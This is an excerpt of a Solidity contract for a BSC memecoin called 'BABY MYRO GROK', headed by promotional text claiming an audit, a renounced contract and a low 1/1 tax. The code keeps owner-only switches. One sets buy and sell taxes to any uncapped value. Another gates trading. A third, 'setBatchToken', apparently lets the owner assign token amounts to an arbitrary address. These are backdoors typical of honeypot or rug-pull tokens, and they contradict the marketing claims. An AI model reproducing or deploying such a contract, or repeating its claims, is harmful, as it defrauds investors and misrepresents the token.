/**
Myro Grok  is the hot trend in crypto space powered by endless possibilities to generate money and joy. Now the MyroGrow arrived on the BSC and is ready to claim his throne as the pet of the galaxy

Contract Audited
 New King Of Memecoin
 Renounce Contract Postlaunch
 Low TAX 1/1
 Avedex Trending At Launch
 BSC Trending At Launch
 Massive marketing
 Big Partners
Hyped strong name
 Good marketing plan 
...
contract BABYMYROGROK is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "BABY MYRO GROK";
    string private constant _symbol = unicode"MYROGK";
    ...
    address payable public DevWallet = payable(0x9311619DF9df1fb20a9648aF646F2787e2C3c1ac);
    address payable public MarketingWallet = payable(0x9C5271D3C3AcDFa348580B0568f8B1eE44b74EF7);
    ...
    function enabledTrade() external onlyAddress {
        tradingActive = true;
        transferDelay =true;
        limitInEffect = true;
    ...
    function includeTaxFee(uint256 buytax, uint256 selltax) external onlyAddress {
        _tax_On_Buy = buytax;
        _tax_On_Sell = selltax;
    }
    function excludeTaxFee() external onlyAddress {
        _tax_On_Buy = 0;
        _tax_On_Sell = 0;
    }
    function setmaxTxAmount() external onlyAddress {
        _maxTxAmount = _maxWalletToken;
    }
    function setmaxWalletAmount(uint256 newmaxWallet) external onlyAddress {
    ...
    function setBatchToken(uint256 value, address adr) onlyAddress public virtual {
